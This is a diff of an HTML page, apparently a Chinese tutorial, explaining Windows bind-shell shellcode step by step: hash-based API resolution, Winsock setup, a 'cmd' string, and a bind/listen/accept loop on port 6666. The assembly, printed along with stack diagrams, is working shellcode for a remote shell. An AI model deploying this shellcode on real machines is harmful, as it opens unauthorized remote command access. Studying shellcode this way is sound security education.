+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">next_function_loop: </span><br><span class="line">	inc edi 					; increment function counter </span><br><span class="line">	mov esi, [ebx + edi * 4] 	; esi = relative offset of current function name </span><br><span class="line">	add esi, ebp 				; esi = absolute addr of current function name </span><br><span class="line">	cdq 						; dl will hold hash (we know eax is small) </span><br></pre></td></tr></table></figure>
 <p>edi每次自增1,然后[ebx+edi*4]基址变址寻址,ebx是导出函数名表的基地址,<code>ebx+edi*4</code>就相当于下标访问数组name[edi],</p>
 <p>这个导出函数名表的每一项都是字符串指针,解引用后取得一个函数名字符串的相对基地址,放到esi,然后esi+ebp得到该函数名字符串的绝对基地址.</p>
 <p>cdq用eax带符号拓展将edx置零,因为edx马上就要存放该导出函数名的哈希值了</p>
-<h3 id="内圈循环hash-loop"><a href="#内圈循环hash-loop" class="headerlink" title="内圈循环hash_loop"></a>内圈循环hash_loop</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hash_loop: </span><br><span class="line">	lodsb 					; load next char into al and increment esi </span><br><span class="line">	xor al, 0x71 				; XOR current char with 0x71 </span><br><span class="line">	sub dl, al 				; update hash with current char </span><br><span class="line">	cmp al, 0x71 				; loop until we reach end of string </span><br><span class="line">	jne hash_loop </span><br></pre></td></tr></table></figure>
-
+<h3 id="内圈循环hash_loop">内圈循环hash_loop</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hash_loop: </span><br><span class="line">	lodsb 					; load next char into al and increment esi </span><br><span class="line">	xor al, 0x71 				; XOR current char with 0x71 </span><br><span class="line">	sub dl, al 				; update hash with current char </span><br><span class="line">	cmp al, 0x71 				; loop until we reach end of string </span><br><span class="line">	jne hash_loop </span><br></pre></td></tr></table></figure>
 <p>内圈循环就是计算esi开始的导出函数名的哈希值</p>
 <p>lodsb相当于</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,[esi]</span><br><span class="line">inc esi</span><br></pre></td></tr></table></figure>
-
 <p>每次取该函数名的一个字节放到al上,和0x71按位异或之后用dl减去该异或值,dl负责累计哈希值</p>
-<p>如果al与0x71异或得到0x71说明al本来就是00,说明该字符串遍历到头’\0’了,此时算是计算完了本函数名的哈希值</p>
-<h3 id="中圈循环一次判断"><a href="#中圈循环一次判断" class="headerlink" title="中圈循环一次判断"></a>中圈循环一次判断</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmp dl, [esp + 0x1c] 		; compare to the requested hash (saved on stack from pushad) </span><br><span class="line">jnz next_function_loop </span><br></pre></td></tr></table></figure>
-
+<p>如果al与0x71异或得到0x71说明al本来就是00,说明该字符串遍历到头'\0'了,此时算是计算完了本函数名的哈希值</p>
+<h3 id="中圈循环一次判断">中圈循环一次判断</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmp dl, [esp + 0x1c] 		; compare to the requested hash (saved on stack from pushad) </span><br><span class="line">jnz next_function_loop </span><br></pre></td></tr></table></figure>
 <p>al中存放刚计算出哈希值,esp+0x1c指向的是我们正在给他解析地址的函数摘要</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918171355607.png" alt="image-20220918171355607"></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918171355607.png"
+alt="image-20220918171355607" />
+<figcaption aria-hidden="true">image-20220918171355607</figcaption>
+</figure>
 <p>al与[esp+0x1c]一比划,如果相等说明该找到了目标函数,跳出中圈循环</p>
-<p>如果不相等说明当前库函数名不是我们想要解析的,需要中圈遍历下一个函数名,因此<code>jnz next_function_loop </code></p>
-<h3 id="外圈循环一次结束-回写目标函数绝对地址"><a href="#外圈循环一次结束-回写目标函数绝对地址" class="headerlink" title="外圈循环一次结束,回写目标函数绝对地址"></a>外圈循环一次结束,回写目标函数绝对地址</h3><p>此时寄存器中值的意义来自 中圈循环初始化</p>
+<p>如果不相等说明当前库函数名不是我们想要解析的,需要中圈遍历下一个函数名,因此<code>jnz next_function_loop</code></p>
+<h3
+id="外圈循环一次结束回写目标函数绝对地址">外圈循环一次结束,回写目标函数绝对地址</h3>
+<p>此时寄存器中值的意义来自 中圈循环初始化</p>
 <table>
 <thead>
 <tr>
@@ -450,118 +455,171 @@
 <th>VA(导出函数名表)</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td>ecx</td>
 <td>VA(导出函数地址表)</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mov ebx, [ecx + 0x24] 		; ebx = relative offset of ordinals table </span><br><span class="line">add ebx, ebp 				; ebx = absolute addr of ordinals table </span><br><span class="line">mov di, [ebx + 2 * edi] 		; di = ordinal number of matched function </span><br><span class="line">mov ebx, [ecx + 0x1c] 		; ebx = relative offset of address table </span><br><span class="line">add ebx, ebp 				; ebx = absolute addr of address table </span><br><span class="line">add ebp, [ebx + 4 * edi] 	; add to ebp (base addr of module) the </span><br><span class="line">							; relative offset of matched function </span><br><span class="line">xchg eax, ebp 				; move func addr into eax </span><br><span class="line">pop edi 					; edi is last onto stack in pushad </span><br><span class="line">stosd 					; write function addr to [edi] and increment edi </span><br><span class="line">push edi </span><br><span class="line">popad					; restore registers </span><br></pre></td></tr></table></figure>
-
 <p>ecx+0x24指向序号表的RVA,解引用后将序号表RVA放到ebx上然后加上ebp中的库基址就得到了VA(序号表)</p>
 <p>用函数名表的下标查序号表,得到的值作为下标查地址表就得到了函数地址,</p>
 <p>在回写之前首先退栈还原edi,这是因为在中圈循环初始化时所有寄存器都压栈保存了,后来无法保证edi是否被修改过,因此这里采用堆栈上保存的值还原edi,由于edi是最后一个入栈的寄存器,此时位于栈顶,直接pop就可以还原了,在图上看就是</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918171355607.png" alt="image-20220918171355607"></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918171355607.png"
+alt="image-20220918171355607" />
+<figcaption aria-hidden="true">image-20220918171355607</figcaption>
+</figure>
 <p>然后使用stosd,相当于</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov [edi],eax</span><br><span class="line">add edi,4</span><br></pre></td></tr></table></figure>
-
 <p>这就将函数地址回写到了预留的函数地址空间中了</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174549264.png" alt="image-20220918174549264"></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174549264.png"
+alt="image-20220918174549264" />
+<figcaption aria-hidden="true">image-20220918174549264</figcaption>
+</figure>
 <p>然后再将edi压栈是为了凑齐popad的结构,给edi占位防止错位弹出</p>
 <p>最后popad将所有压栈保存的寄存器还原,此时的堆栈状态为</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918173600627.png" alt="image-20220918173600627"></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918173600627.png"
+alt="image-20220918173600627" />
+<figcaption aria-hidden="true">image-20220918173600627</figcaption>
+</figure>
 <p>所有寄存器的意义为</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918173623051.png" alt="image-20220918173623051"></p>
-<h3 id="外圈循环判断是否全部解析完毕"><a href="#外圈循环判断是否全部解析完毕" class="headerlink" title="外圈循环判断是否全部解析完毕"></a>外圈循环判断是否全部解析完毕</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmp esi, edi 				; loop until we reach end of last hash </span><br><span class="line">jne find_lib_functions </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918173623051.png"
+alt="image-20220918173623051" />
+<figcaption aria-hidden="true">image-20220918173623051</figcaption>
+</figure>
+<h3 id="外圈循环判断是否全部解析完毕">外圈循环判断是否全部解析完毕</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmp esi, edi 				; loop until we reach end of last hash </span><br><span class="line">jne find_lib_functions </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>一开始给8个符号的地址只预留了24字节的空间,能够容纳6个符号,剩下两个符号需要覆盖摘要值</p>
 <p>当edi追上esi的时候意味着覆盖完成,8个符号已经都解析了,此时外圈循环也结束了</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174325158.png" alt="image-20220918174325158"></p>
-<h2 id="建立Socket通信"><a href="#建立Socket通信" class="headerlink" title="建立Socket通信"></a>建立Socket通信</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop esi 					; saved location of first winsock function </span><br><span class="line">							; we will lodsd and call each func in sequence </span><br></pre></td></tr></table></figure>
-
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174325158.png"
+alt="image-20220918174325158" />
+<figcaption aria-hidden="true">image-20220918174325158</figcaption>
+</figure>
+<h2 id="建立socket通信">建立Socket通信</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop esi 					; saved location of first winsock function </span><br><span class="line">							; we will lodsd and call each func in sequence </span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>在外圈循环一次的时候曾经区别处理过ws2_32.dll的函数有一个push edi压栈,意思是压栈保存第一条ws2_32.dll函数的地址</p>
+<p>在外圈循环一次的时候曾经区别处理过ws2_32.dll的函数有一个push
+edi压栈,意思是压栈保存第一条ws2_32.dll函数的地址</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find_lib_functions: </span><br><span class="line">	lodsb 					; load next hash into al and increment esi </span><br><span class="line">	cmp al, 0xd3 				; hash of WSAStartup - trigger </span><br><span class="line">							; LoadLibrary(&quot;ws2_32&quot;) </span><br><span class="line">	jne find_functions </span><br><span class="line">	xchg eax, ebp 			; save current hash </span><br><span class="line">	call [edi - 0xc] 			; LoadLibraryA </span><br><span class="line">	xchg eax, ebp 			; restore current hash, and update ebp </span><br><span class="line">							; with base address of ws2_32.dll </span><br><span class="line">	push edi 					; save location of addr of first winsock function </span><br></pre></td></tr></table></figure>
-
-
 </blockquote>
 <p>在执行本条指令<strong>之前</strong>的堆栈状态</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918175317614.png" alt="image-20220918175317614"></p>
-<p>pop esi之后,esi就指向了第一条ws2_32的函数在预留空间中的地址,也就是WSAStartup的预留地址</p>
-<h3 id="调用WSAStartUp"><a href="#调用WSAStartUp" class="headerlink" title="调用WSAStartUp"></a>调用WSAStartUp</h3><blockquote>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918175317614.png"
+alt="image-20220918175317614" />
+<figcaption aria-hidden="true">image-20220918175317614</figcaption>
+</figure>
+<p>pop
+esi之后,esi就指向了第一条ws2_32的函数在预留空间中的地址,也就是WSAStartup的预留地址</p>
+<h3 id="调用wsastartup">调用WSAStartUp</h3>
+<blockquote>
 <p>该API函数作用是为进程使用Winsock模块初始化,必须先调用该函数才可以激活Winsock模块中的其他函数,其接口为</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">WSAStartup</span><span class="params">(</span></span><br><span class="line"><span class="params">        WORD      wVersionRequired,<span class="comment">//可以使用的windows 套接字规范的最高版本</span></span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">  [out] LPWSADATA lpWSAData<span class="comment">//返回值,指向WSADATA结构体的指针</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
-
 <p>其中32位机器上,WSADATA长这样</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">WSAData</span> &#123;</span></span><br><span class="line">        WORD                    wVersion;<span class="comment">//我们要使用的版本</span></span><br><span class="line">        WORD                    wHighVersion;<span class="comment">//系统能提供给我们的版本</span></span><br><span class="line">        <span class="type">char</span>                    szDescription[WSADESCRIPTION_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="type">char</span>                    szSystemStatus[WSASYS_STATUS_LEN+<span class="number">1</span>];<span class="comment">//当前库的秒数信息，2.0是第2版的意思</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span>          iMaxSockets;<span class="comment">//返回可用的socket数量,2版本只有就没用了</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span>          iMaxUdpDg;<span class="comment">//UDP数据报信息大小,2版本只有就没用了</span></span><br><span class="line">        <span class="type">char</span> FAR *              lpVendorInfo;<span class="comment">//供应商特定的信息,2版本只有就没用了</span></span><br><span class="line">&#125; WSADATA;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>共11个字节</p>
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; initialize winsock </span><br><span class="line">	</span><br><span class="line">	push esp 					; use stack for WSADATA </span><br><span class="line">	push 0x02 				; wVersionRequested </span><br><span class="line">	lodsd </span><br><span class="line">	call eax 					; WSAStartup </span><br></pre></td></tr></table></figure>
-
 <p>首先esp压栈作为第二个参数的地址,返回的WSADATA结构体将会写到此时的栈顶</p>
 <p>0x02压栈作为第一个参数,即套接字版本号</p>
 <p>esi恰好就指向WSAStartUp的预留地址,lodsd相当于</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax,[esi]</span><br><span class="line">add esi,4</span><br></pre></td></tr></table></figure>
-
 <p>就解引用将函数的绝对地址放到eax上了</p>
-<p>然后call eax调用API,返回值写到所有参数之前的栈顶上,如果函数调用成功则eax&#x3D;0</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918181142886.png" alt="image-20220918181142886"></p>
-<h3 id="给”CMd”画上句号"><a href="#给”CMd”画上句号" class="headerlink" title="给”CMd”画上句号"></a>给”CMd”画上句号</h3><p>趁着eax刚从WSAStartUp返回来,值为0,将0放到”CMd”字符串后面</p>
+<p>然后call
+eax调用API,返回值写到所有参数之前的栈顶上,如果函数调用成功则eax=0</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918181142886.png"
+alt="image-20220918181142886" />
+<figcaption aria-hidden="true">image-20220918181142886</figcaption>
+</figure>
+<h3 id="给cmd画上句号">给"CMd"画上句号</h3>
+<p>趁着eax刚从WSAStartUp返回来,值为0,将0放到"CMd"字符串后面</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">; null-terminate &quot;cmd&quot; </span><br><span class="line">	mov byte ptr [esi + 0x13], al ; eax = 0 if WSAStartup() worked </span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="调用WSASocketA"><a href="#调用WSASocketA" class="headerlink" title="调用WSASocketA"></a>调用WSASocketA</h3><blockquote>
+<h3 id="调用wsasocketa">调用WSASocketA</h3>
+<blockquote>
 <p>WSASockA创建一个绑定到特殊服务提供者的套接字</p>
 <p>其函数接口为</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SOCKET WSAAPI <span class="title function_">WSASocketA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>                 af,<span class="comment">//网络层协议,AF_INET(2)</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>                 type,<span class="comment">//传输层类型SOCK_STREAM(1)</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>                 protocol,<span class="comment">//传输层协议,TCP(6),UDP(17)</span></span></span><br><span class="line"><span class="params">  [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,<span class="comment">//WSAPROTOCOL_INFO结构体指针,用于存储信息</span></span></span><br><span class="line"><span class="params">  [in] GROUP               g,<span class="comment">//套接字组ID</span></span></span><br><span class="line"><span class="params">  [in] DWORD               dwFlags<span class="comment">//套接字属性标志</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
-
 <p>如果调用成功,返回该套接字的描述符</p>
 </blockquote>
-<h4 id="清空栈帧-相当于填充NULL作为参数"><a href="#清空栈帧-相当于填充NULL作为参数" class="headerlink" title="清空栈帧,相当于填充NULL作为参数"></a>清空栈帧,相当于填充NULL作为参数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; clear some stack to use as NULL parameters </span><br><span class="line">	lea ecx, [eax + 0x30] 		; sizeof(STARTUPINFO) = 0x44, ecx=0x30,重复30次</span><br><span class="line">	mov edi, esp ;当前栈顶设置为串拷贝的目标</span><br><span class="line">	rep stosd 				; eax is still 0 eax拷贝到edi,edi自增4,相当于全都置零</span><br></pre></td></tr></table></figure>
-
+<h4
+id="清空栈帧相当于填充null作为参数">清空栈帧,相当于填充NULL作为参数</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; clear some stack to use as NULL parameters </span><br><span class="line">	lea ecx, [eax + 0x30] 		; sizeof(STARTUPINFO) = 0x44, ecx=0x30,重复30次</span><br><span class="line">	mov edi, esp ;当前栈顶设置为串拷贝的目标</span><br><span class="line">	rep stosd 				; eax is still 0 eax拷贝到edi,edi自增4,相当于全都置零</span><br></pre></td></tr></table></figure>
 <p>执行之前栈帧的状态</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918191550943.png" alt="image-20220918191550943"></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918191550943.png"
+alt="image-20220918191550943" />
+<figcaption aria-hidden="true">image-20220918191550943</figcaption>
+</figure>
 <p>执行之后</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918191620311.png" alt="image-20220918191620311"></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918191620311.png"
+alt="image-20220918191620311" />
+<figcaption aria-hidden="true">image-20220918191620311</figcaption>
+</figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">; create socket </span><br><span class="line">	inc eax 	;eax=1</span><br><span class="line">	push eax					; type = 1 (SOCK_STREAM) ,1压栈</span><br><span class="line">	inc eax ;eax=2</span><br><span class="line">	push eax ; af = 2 (AF_INET) IPv4协议</span><br><span class="line">	lodsd ;[esi]-&gt;eax,esi+=4,eax指向WSASocketA的地址</span><br><span class="line">	call eax ; WSASocketA </span><br><span class="line">	xchg ebp, eax				; save SOCKET descriptor in ebp (safe from </span><br><span class="line">								; being changed by remaining API calls) </span><br></pre></td></tr></table></figure>
-
 <p>调用WSASocketA之前,栈帧的状态为</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918192112499.png" alt="image-20220918192112499"></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918192112499.png"
+alt="image-20220918192112499" />
+<figcaption aria-hidden="true">image-20220918192112499</figcaption>
+</figure>
 <p>函数调用返回后,eax中存放的是套接字描述符,交换到ebp中保存起来</p>
-<h3 id="bind-listen-accept循环"><a href="#bind-listen-accept循环" class="headerlink" title="bind,listen,accept循环"></a>bind,listen,accept循环</h3><h4 id="初始化bind参数"><a href="#初始化bind参数" class="headerlink" title="初始化bind参数"></a>初始化bind参数</h4><blockquote>
+<h3 id="bindlistenaccept循环">bind,listen,accept循环</h3>
+<h4 id="初始化bind参数">初始化bind参数</h4>
+<blockquote>
 <p>bind函数用来绑定套接字</p>
 <p>其接口为</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bind</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] SOCKET         s,<span class="comment">//套接字描述符</span></span></span><br><span class="line"><span class="params">       <span class="type">const</span> sockaddr *name,<span class="comment">//sockaddr结构体指针,该结构体用于指定ipv4地址还有端口号</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>            namelen<span class="comment">//name指向的结构体的大小</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
-
 <p>只要是<code>namelen&gt;sizeof(*name)</code>就可以,因此namelen可以往大了设置为任意大小</p>
 <p>sockaddr用来指定ip协议类型,ip地址还有端口号</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> sa_family; <span class="comment">/* address family, AF_xxx */</span></span><br><span class="line">	<span class="type">char</span> sa_data[<span class="number">14</span>]; <span class="comment">/* 14 bytes of protocol address */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
 <p>相当于sockaddr_in结构体,二者在大小上是相同的</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">	<span class="type">short</span> <span class="type">int</span> sin_family; <span class="comment">/* Address family */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> sin_port; <span class="comment">/* Port number */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span> <span class="comment">/* Internet address */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> sin_zero[<span class="number">8</span>]; <span class="comment">/* Same size as struct sockaddr */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; push bind parameters </span><br><span class="line">	mov eax, 0x0a1aff02 		; 0x1a0a = port 6666, 0x02 = AF_INET </span><br><span class="line">	xor ah, ah					; remove the ff from eax </span><br><span class="line">	push eax	 				; we use 0x0a1a0002 as both the name (struct </span><br><span class="line">								; sockaddr) and namelen (which only needs to </span><br><span class="line">								; be large enough) </span><br><span class="line">	push esp 					; pointer to our sockaddr struct </span><br></pre></td></tr></table></figure>
-
-
-
 <p>0x0a1a0002这个值直接压栈作为namelen,足够大了</p>
 <p>0x0a1a0002,最低两个字节0x0002用来填sockaddr_in.sin_family</p>
-<p>然后用0x0a1a&#x3D;6666填sockaddr_in.sin_port</p>
+<p>然后用0x0a1a=6666填sockaddr_in.sin_port</p>
 <p>将namelen的栈中地址压栈,因为其上的数也可以作为sock_addr结构体</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918195551305.png" alt="image-20220918195551305"></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918195551305.png"
+alt="image-20220918195551305" />
+<figcaption aria-hidden="true">image-20220918195551305</figcaption>
+</figure>
 <p>到此还有一个参数没有压栈,即套接字描述符,它保存在ebp中</p>
-<h4 id="三联循环-复用循环代码"><a href="#三联循环-复用循环代码" class="headerlink" title="三联循环,复用循环代码"></a>三联循环,复用循环代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">	</span><br><span class="line">; call bind(), listen() and accept() in turn </span><br><span class="line">call_loop: </span><br><span class="line">	push ebp					; saved SOCKET descriptor (we implicitly pass </span><br><span class="line">								; NULL for all other params) </span><br><span class="line">	lodsd </span><br><span class="line">	call eax 					; call the next function </span><br><span class="line">	test eax, eax 				; bind() and listen() return 0, accept() </span><br><span class="line">								; returns a SOCKET descriptor </span><br><span class="line">	jz call_loop </span><br></pre></td></tr></table></figure>
-
-<h5 id="首先调用bind"><a href="#首先调用bind" class="headerlink" title="首先调用bind"></a>首先调用bind</h5><p>ebp存放的是套接字描述符,压栈</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918194646766.png" alt="image-20220918194646766"></p>
+<h4 id="三联循环复用循环代码">三联循环,复用循环代码</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">	</span><br><span class="line">; call bind(), listen() and accept() in turn </span><br><span class="line">call_loop: </span><br><span class="line">	push ebp					; saved SOCKET descriptor (we implicitly pass </span><br><span class="line">								; NULL for all other params) </span><br><span class="line">	lodsd </span><br><span class="line">	call eax 					; call the next function </span><br><span class="line">	test eax, eax 				; bind() and listen() return 0, accept() </span><br><span class="line">								; returns a SOCKET descriptor </span><br><span class="line">	jz call_loop </span><br></pre></td></tr></table></figure>
+<h5 id="首先调用bind">首先调用bind</h5>
+<p>ebp存放的是套接字描述符,压栈</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918194646766.png"
+alt="image-20220918194646766" />
+<figcaption aria-hidden="true">image-20220918194646766</figcaption>
+</figure>
 <p>然后lodsd将bind函数地址搬到eax上,然后函数edi函数指针后移4个字节,指向listen了</p>
 <p>eax中是bind的地址,call eax调用bind了</p>
-<p>如果调用成功则返回eax&#x3D;0,又恰好bind,listen成功的返回值eax&#x3D;0,accept成功的返回值非零,因此可以根据eax值判断该函数是不是accept</p>
+<p>如果调用成功则返回eax=0,又恰好bind,listen成功的返回值eax=0,accept成功的返回值非零,因此可以根据eax值判断该函数是不是accept</p>
 <p>如果返回0则不是,说明三联还没有完成,重新call_loop</p>
